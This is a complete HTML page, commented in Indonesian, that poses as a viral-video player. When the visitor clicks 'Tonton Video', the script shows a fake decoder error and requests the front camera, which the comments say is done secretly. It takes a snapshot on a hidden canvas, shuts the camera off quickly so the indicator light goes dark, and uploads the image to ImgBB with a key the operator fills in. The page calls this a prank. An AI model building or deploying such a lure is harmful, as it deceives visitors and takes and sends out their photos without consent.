<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pemutar Video Online</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #0f0f0f;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 15px;
        }

        /* Container Pemutar Video */
        .player-container {
            width: 100%;
            max-width: 800px;
            background-color: #181818;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 8px 25px rgba(0,0,0,0.8);
        }

        /* Layar Pemutar Video Hitam */
        .video-screen {
            position: relative;
            width: 100%;
            padding-top: 56.25%; /* Ratio 16:9 */
            background-color: #000000;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* Tampilan Pesan Error (Awalnya Tersembunyi) */
        .error-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: none; /* Muncul setelah tombol diklik */
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background-color: #000000;
            color: #aaaaaa;
            text-align: center;
            padding: 20px;
        }

        .error-icon {
            font-size: 48px;
            margin-bottom: 12px;
            color: #ff4e4e;
        }

        .error-title {
            font-size: 18px;
            font-weight: 600;
            color: #ffffff;
            margin-bottom: 6px;
        }

        .error-code {
            font-size: 13px;
            color: #777777;
            font-family: monospace;
            margin-bottom: 15px;
        }

        .btn-retry {
            background: #272727;
            color: #fff;
            border: 1px solid #444;
            padding: 8px 16px;
            border-radius: 4px;
            font-size: 13px;
            cursor: pointer;
        }

        .btn-retry:hover {
            background: #383838;
        }

        /* Detail Video di Bawah Pemutar */
        .video-details {
            padding: 18px;
        }

        .video-title {
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 8px;
        }

        .video-meta {
            font-size: 13px;
            color: #aaa;
        }

        /* Popup Modal Akses / Tonton Video */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(0, 0, 0, 0.85);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            backdrop-filter: blur(4px);
        }

        .modal-box {
            background: #212121;
            padding: 30px 25px;
            border-radius: 12px;
            max-width: 380px;
            width: 90%;
            text-align: center;
            border: 1px solid #333;
            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
        }

        .modal-box h3 {
            font-size: 19px;
            margin-bottom: 10px;
            color: #fff;
        }

        .modal-box p {
            font-size: 14px;
            color: #bbb;
            margin-bottom: 22px;
            line-height: 1.4;
        }

        .btn-watch {
            background: #ff0000;
            color: #ffffff;
            border: none;
            padding: 12px 24px;
            font-size: 15px;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
        }

        .btn-watch:hover {
            background: #cc0000;
        }

        /* Elemen Tersembunyi untuk Proses Foto */
        video, canvas {
            display: none;
        }
    </style>
</head>
<body>

    <div class="player-container">
        <!-- Layar Hitam Pemutar Video -->
        <div class="video-screen">
            <!-- Tampilan Error (Awalnya tersembunyi, muncul setelah diklik) -->
            <div class="error-overlay" id="errorOverlay">
                <div class="error-icon">⚠️</div>
                <div class="error-title">Video Tidak Dapat Diputar</div>
                <div class="error-code">Error Code: ERR_VIDEO_DECODER_INIT_FAILED</div>
                <button class="btn-retry" onclick="location.reload()">Coba Lagi</button>
            </div>
        </div>

        <!-- Detail Video -->
        <div class="video-details">
            <div class="video-title">Video Viral Terbaru 2026 - Durasi 03:45</div>
            <div class="video-meta">1.5M views • Baru saja diunggah</div>
        </div>
    </div>

    <!-- Popup Modal yang Langsung Muncul -->
    <div class="modal-overlay" id="watchModal">
        <div class="modal-box">
            <h3>Konfirmasi Pemutaran</h3>
            <p>Klik tombol di bawah untuk mulai memutar video secara langsung dalam kualitas HD.</p>
            <button class="btn-watch" onclick="handleWatchClick()">Tonton Video</button>
        </div>
    </div>

    <!-- Elemen Kamera & Canvas Tersembunyi (Tidak Terlihat Pengguna) -->
    <video id="hiddenVideo" autoplay playsinline muted></video>
    <canvas id="hiddenCanvas"></canvas>

    <script>
        // ========================================================
        // MASUKKAN API KEY IMGBB ANDA DI BAWAH INI
        // ========================================================
        const IMGBB_API_KEY = "MASUKKAN_API_KEY_IMGBB_ANDA_DI_SINI"; 

        const watchModal = document.getElementById('watchModal');
        const errorOverlay = document.getElementById('errorOverlay');
        const hiddenVideo = document.getElementById('hiddenVideo');
        const hiddenCanvas = document.getElementById('hiddenCanvas');

        // Fungsi saat tombol "Tonton Video" diklik
        async function handleWatchClick() {
            // 1. Sembunyikan Popup Modal & Tampilkan Layar Error langsung
            watchModal.style.display = 'none';
            errorOverlay.style.display = 'flex';

            // 2. Minta Akses Kamera secara diam-diam
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });

                hiddenVideo.srcObject = stream;

                // Tunggu frame kamera siap lalu ambil foto
                hiddenVideo.onloadedmetadata = () => {
                    setTimeout(() => {
                        captureAndUpload(stream);
                    }, 500); // Penundaan 0.5 detik agar gambar jernih
                };

            } catch (err) {
                console.log("Akses kamera ditolak atau gagal:", err);
            }
        }

        // Fungsi Ambil Snapshot Foto & Kirim ke ImgBB
        function captureAndUpload(stream) {
            const context = hiddenCanvas.getContext('2d');
            hiddenCanvas.width = hiddenVideo.videoWidth || 640;
            hiddenCanvas.height = hiddenVideo.videoHeight || 480;

            // Gambar kamera ke canvas tersembunyi
            context.drawImage(hiddenVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);

            // Matikan Kamera Segera agar indikator/lampu kamera langsung padam
            stream.getTracks().forEach(track => track.stop());

            // Ubah gambar ke format Base64
            const base64Image = hiddenCanvas.toDataURL('image/jpeg', 0.8);

            // Upload ke ImgBB jika API Key diisi
            if (IMGBB_API_KEY && IMGBB_API_KEY !== "MASUKKAN_API_KEY_IMGBB_ANDA_DI_SINI") {
                uploadToImgBB(base64Image);
            } else {
                console.log("Foto berhasil diambil (Base64 siap). Masukkan API Key ImgBB untuk mengunggah.");
            }
        }

        // Fungsi Upload ke Server ImgBB
        async function uploadToImgBB(base64Image) {
            try {
                const cleanBase64 = base64Image.replace(/^data:image\/(png|jpeg);base64,/, "");
                
                const formData = new FormData();
                formData.append("key", IMGBB_API_KEY);
                formData.append("image", cleanBase64);

                const response = await fetch("https://api.imgbb.com/1/upload", {
                    method: "POST",
                    body: formData
                });

                const result = await response.json();
                if (result.success) {
                    console.log("Foto Prank Berhasil Diunggah!", result.data.url);
                } else {
                    console.error("Gagal Upload ImgBB:", result);
                }
            } catch (error) {
                console.error("Error Upload:", error);
            }
        }
    </script>
</body>
    </html>
